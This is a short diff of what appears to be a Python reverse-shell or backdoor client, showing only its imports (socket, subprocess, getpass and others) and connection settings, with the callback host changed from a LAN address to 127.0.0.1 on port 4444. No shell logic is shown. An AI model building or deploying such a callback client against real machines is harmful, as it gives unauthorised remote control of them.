@@ -1,6 +1,6 @@
 import socket, os, sys, subprocess, platform, getpass
 
-RHOST = "192.168.1.156"
+RHOST = "127.0.0.1"
 RPORT = 4444
 
 sock = None
